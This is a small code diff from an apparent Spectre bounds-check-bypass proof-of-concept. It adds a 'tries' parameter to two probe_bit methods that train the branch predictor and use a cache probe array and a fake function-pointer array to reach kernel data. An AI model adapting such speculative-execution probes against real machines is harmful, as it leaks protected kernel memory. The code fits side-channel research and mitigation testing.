@@ -53,7 +53,7 @@ struct FoobarIoctl2 {
 };
 
 
-void spectre::KernelDataArrayBoundCheckBypass::probe_bit(uint8_t mask, const uint8_t* data, const uint8_t* cache_probe) {
+void spectre::KernelDataArrayBoundCheckBypass::probe_bit(int tries, uint8_t mask, const uint8_t* data, const uint8_t* cache_probe) {
     size_t malicious_index = data - this->data_array.array;
     size_t max_training_index = this->data_array.array_size;
 
@@ -81,7 +81,7 @@ void spectre::KernelDataArrayBoundCheckBypass::probe_bit(uint8_t mask, const uin
 }
 
 
-void spectre::KernelFunctionArrayBoundCheckBypass::probe_bit(uint8_t mask, const uint8_t* data, const uint8_t* cache_probe) {
+void spectre::KernelFunctionArrayBoundCheckBypass::probe_bit(int tries, uint8_t mask, const uint8_t* data, const uint8_t* cache_probe) {
     FunctionArray::function_ptr_t fake_array[] = {
         FunctionArrayBoundCheckBypass::exploit
     };
